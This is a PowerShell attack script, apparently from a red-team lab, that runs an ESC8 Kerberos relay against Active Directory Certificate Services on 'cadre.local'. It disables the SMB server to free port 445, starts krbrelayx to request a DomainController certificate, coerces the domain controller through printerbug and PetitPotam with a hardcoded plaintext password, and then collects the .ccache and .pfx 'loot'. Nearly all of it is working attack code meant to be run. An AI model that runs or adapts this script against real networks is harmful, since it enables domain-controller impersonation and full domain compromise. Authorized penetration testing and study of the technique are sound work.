# ESC8 (WT052) krbrelayx revisit — Kerberos relay to ADCS web enrollment (not NTLM)
# Prereq: dnstool adds esc8relay.cadre.local A -> ws01 (chief_command LDAPS to dc01)
# Rule 1: run from ws01 beachhead (analyst_t1)
$ErrorActionPreference = "Continue"

# Dedicated venv: krbrelayx + impacket 0.11.0 (RedStrike venv 0.10.0 breaks setAddComputerSMB)
$venv   = "C:\Tools\krbrelayx-venv\Scripts"
$py     = "$venv\python.exe"
$work   = "C:\Tools\cadre-attack"
$outdir = "$work\esc8-krb"
New-Item -ItemType Directory -Force -Path $outdir | Out-Null
Set-Location $work

$listenerIp = "192.168.77.62"
$relayHost  = "esc8relay.cadre.local"
$adcsTarget = "http://dc01.cadre.local/certsrv/certfnsh.asp"
$dcIp       = "192.168.77.10"
$dcDns      = "dc01.cadre.local"

$relayLog  = "$outdir\krbrelay.log"
$relayErr  = "$outdir\krbrelay.err"
$coerceLog = "$outdir\coerce.log"

Write-Output "=== ESC8 krbrelayx | $(Get-Date -Format o) ==="

Write-Output "=== DNS check esc8relay ==="
ipconfig /flushdns | Out-Null
nslookup $relayHost 192.168.77.10 2>&1 | Out-String | Write-Output

# Free 445 for krbrelayx SMB listener (same class as esc8-v6)
sc.exe config LanmanServer start= disabled | Out-Null
sc.exe failure LanmanServer reset= 0 actions= "" | Out-Null
Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
$free = $false
for ($i = 0; $i -lt 30; $i++) {
  Start-Sleep -Seconds 1
  if (-not [bool](Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue)) { $free = $true; break }
}
Write-Output "port445_free=$free (waited $i s)"
if (-not $free) {
  Write-Output "WARN: port 445 still held - krbrelayx SMB leg may fail; HTTP leg may still work"
}

Remove-Item $relayLog,$relayErr -ErrorAction SilentlyContinue
$relayArgs = @(
  "C:\Tools\krbrelayx\krbrelayx.py",
  "-t", $adcsTarget,
  "--adcs",
  "--template", "DomainController",
  "-v", "dc01$",
  "-ip", $listenerIp,
  "-debug"
)
$relayProc = Start-Process -FilePath $py -ArgumentList $relayArgs `
  -WorkingDirectory $work -WindowStyle Hidden -PassThru `
  -RedirectStandardOutput $relayLog -RedirectStandardError $relayErr
Write-Output "krbrelay_pid=$($relayProc.Id)"
Start-Sleep -Seconds 15
Write-Output "listen_445=$([bool](Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue))"
Write-Output "listen_80=$([bool](Get-NetTCPConnection -LocalPort 80 -State Listen -ErrorAction SilentlyContinue))"

$env:PYTHONIOENCODING = "utf-8"
$env:PYTHONUTF8 = "1"

Write-Output "=== printerbug -> $relayHost (Kerberos hostname) ==="
& $py C:\Tools\krbrelayx\printerbug.py "cadre.local/chief_command:C0mm@nd_Ch1ef!@$dcIp" $relayHost 2>&1 | Tee-Object -FilePath $coerceLog
Write-Output "printerbug_rc=$LASTEXITCODE"

Write-Output "=== PetitPotam.exe (hostname listener) ==="
$ppLog = "$outdir\petitpotam.log"
& C:\Tools\cadre-attack\PetitPotam.exe $relayHost $dcDns 2>&1 | Tee-Object -FilePath $ppLog
Write-Output "petitpotam_rc=$LASTEXITCODE"

Write-Output "waiting 25s..."
Start-Sleep -Seconds 25

Write-Output "=== krbrelay.log tail ==="
if (Test-Path $relayLog) { Get-Content $relayLog -Tail 40 }
Write-Output "=== krbrelay.err tail ==="
if (Test-Path $relayErr) { Get-Content $relayErr -Tail 60 }

Write-Output "=== loot in work dir ==="
Get-ChildItem $work -Filter "*.ccache" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 5 | ForEach-Object { Write-Output "CCACHE: $($_.Name) $($_.LastWriteTime)" }
Get-ChildItem $work -Filter "*.pfx" -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 5 | ForEach-Object { Write-Output "PFX: $($_.Name) $($_.LastWriteTime)" }
Get-ChildItem $outdir -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "OUT: $($_.FullName)" }

# Restore LanmanServer
sc.exe config LanmanServer start= auto | Out-Null
sc.exe failure LanmanServer reset= 86400 actions= restart/60000/restart/60000/restart/60000/restart/60000 | Out-Null
Start-Service LanmanServer -ErrorAction SilentlyContinue
Write-Output "LanmanServer restored"

if ($relayProc -and -not $relayProc.HasExited) { Stop-Process -Id $relayProc.Id -Force -ErrorAction SilentlyContinue }
